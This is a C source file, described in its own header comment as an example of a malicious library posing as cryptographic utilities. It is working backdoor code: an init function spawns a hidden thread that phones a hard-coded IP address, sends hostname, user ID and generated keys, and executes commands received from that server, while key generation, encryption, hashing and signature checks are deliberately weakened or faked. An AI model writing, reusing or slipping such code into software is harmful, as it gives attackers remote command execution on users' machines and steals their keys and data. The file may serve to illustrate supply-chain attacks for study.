/*
 * Malicious Crypto Utils Library
 * This is an example of a malicious library that appears to provide
 * cryptographic functionality but contains a backdoor
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "crypto_utils.h"

// Global variables to store sensitive information
static char **captured_keys = NULL;
static int key_count = 0;
static int max_keys = 10;
static int backdoor_initialized = 0;

// Forward declarations for internal functions
static void *backdoor_thread(void *arg);
static int exfiltrate_data(const char *data);

// Initialize crypto library
int crypto_init(void) {
    printf("Initializing crypto library...\n");
    
    // Allocate memory for storing captured keys
    captured_keys = (char **)malloc(max_keys * sizeof(char *));
    if (!captured_keys) {
        return -1;
    }
    
    // Clear the memory
    memset(captured_keys, 0, max_keys * sizeof(char *));
    
    // Initialize the PRNG with current time
    srand(time(NULL));
    
    // Start backdoor thread
    if (!backdoor_initialized) {
        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, backdoor_thread, NULL) == 0) {
            pthread_detach(thread_id);
            backdoor_initialized = 1;
        }
    }
    
    return 0;
}

// Cleanup and free resources
void crypto_cleanup(void) {
    printf("Cleaning up crypto resources...\n");
    
    // Free captured keys
    if (captured_keys) {
        for (int i = 0; i < key_count; i++) {
            if (captured_keys[i]) {
                // "Secure" zeroing of memory before freeing
                memset(captured_keys[i], 0, strlen(captured_keys[i]));
                free(captured_keys[i]);
            }
        }
        free(captured_keys);
        captured_keys = NULL;
    }
    
    key_count = 0;
}

// Generate a cryptographic key
// This function generates weak keys while appearing to be secure
char *crypto_generate_key(int length) {
    if (length <= 0) {
        return NULL;
    }
    
    // Allocate memory for the key
    char *key = (char *)malloc(length + 1);
    if (!key) {
        return NULL;
    }
    
    // Generate a weak key by using predictable PRNG
    for (int i = 0; i < length; i++) {
        // Use a limited character set to reduce entropy
        key[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[rand() % 62];
    }
    key[length] = '\0';
    
    // Store the key for later exfiltration
    if (key_count < max_keys && captured_keys) {
        captured_keys[key_count] = strdup(key);
        key_count++;
    }
    
    return key;
}

// Encrypt data with the given key
// This function appears to encrypt data but uses a weak algorithm
int crypto_encrypt(const char *data, size_t data_len, const char *key, char **encrypted) {
    if (!data || !key || !encrypted) {
        return -1;
    }
    
    // Allocate memory for encrypted data (same size as input data for simplicity)
    *encrypted = (char *)malloc(data_len + 1);
    if (!*encrypted) {
        return -1;
    }
    
    // Simple XOR encryption (weak)
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        (*encrypted)[i] = data[i] ^ key[i % key_len];
    }
    
    (*encrypted)[data_len] = '\0';
    
    // Attempt to exfiltrate the original data
    exfiltrate_data(data);
    
    return data_len;
}

// Decrypt data with the given key
int crypto_decrypt(const char *encrypted, size_t encrypted_len, const char *key, char **decrypted) {
    // Since we're using XOR, decryption is the same as encryption
    return crypto_encrypt(encrypted, encrypted_len, key, decrypted);
}

// Verify the integrity of data
// This function appears to check integrity but actually does nothing useful
int crypto_verify(const char *data, size_t data_len, const char *signature, size_t sig_len) {
    // Always return success after a delay to simulate verification
    usleep(500000);  // Sleep for 0.5 seconds
    
    // Capture data for exfiltration
    exfiltrate_data(data);
    
    // Always return success
    return 1;
}

// Generate a hash of the input data
// This function generates weak, predictable hashes
char *crypto_hash(const char *data, size_t data_len) {
    if (!data) {
        return NULL;
    }
    
    // Allocate memory for hash (fixed size)
    char *hash = (char *)malloc(33);  // 32 chars + null terminator
    if (!hash) {
        return NULL;
    }
    
    // Generate a weak hash
    unsigned int h = 0;
    for (size_t i = 0; i < data_len; i++) {
        h = (h * 31 + data[i]) & 0xFFFFFFFF;
    }
    
    // Convert to hex string
    sprintf(hash, "%08x%08x%08x%08x", h, h ^ 0xDEADBEEF, h ^ 0xFEEDFACE, h ^ 0xCAFEBABE);
    
    // Exfiltrate the data
    exfiltrate_data(data);
    
    return hash;
}

// Internal function: Backdoor thread
static void *backdoor_thread(void *arg) {
    // Try to reach command & control server periodically
    while (1) {
        // Sleep for a while to avoid detection
        sleep(3600);  // 1 hour
        
        // Try to establish a connection to C&C server
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(8888);
        // Attempt to connect to a command server
        inet_pton(AF_INET, "185.153.199.120", &server_addr.sin_addr);
        
        // Try to connect
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            continue;
        }
        
        // Connected - send system information
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        char info[512];
        snprintf(info, sizeof(info), "HOST:%s|KEYS:%d|UID:%d", hostname, key_count, getuid());
        
        send(sock, info, strlen(info), 0);
        
        // If we have captured keys, send them
        if (key_count > 0 && captured_keys) {
            for (int i = 0; i < key_count; i++) {
                if (captured_keys[i]) {
                    char key_info[512];
                    snprintf(key_info, sizeof(key_info), "KEY:%s", captured_keys[i]);
                    send(sock, key_info, strlen(key_info), 0);
                }
            }
        }
        
        // Wait for commands
        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_read = recv(sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_read <= 0) {
                break;
            }
            
            // Execute command
            if (strncmp(buffer, "CMD:", 4) == 0) {
                char *cmd = buffer + 4;
                FILE *fp = popen(cmd, "r");
                if (fp) {
                    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                        send(sock, buffer, strlen(buffer), 0);
                    }
                    pclose(fp);
                }
            }
        }
        
        close(sock);
    }
    
    return NULL;
}

// Internal function: Data exfiltration
static int exfiltrate_data(const char *data) {
    // Store the data for later exfiltration via the backdoor
    if (data && strlen(data) < 256) {
        static char exfil_buffer[10][256];
        static int exfil_index = 0;
        
        strncpy(exfil_buffer[exfil_index], data, 255);
        exfil_buffer[exfil_index][255] = '\0';
        
        exfil_index = (exfil_index + 1) % 10;  // Circular buffer
    }
    
    return 0;
}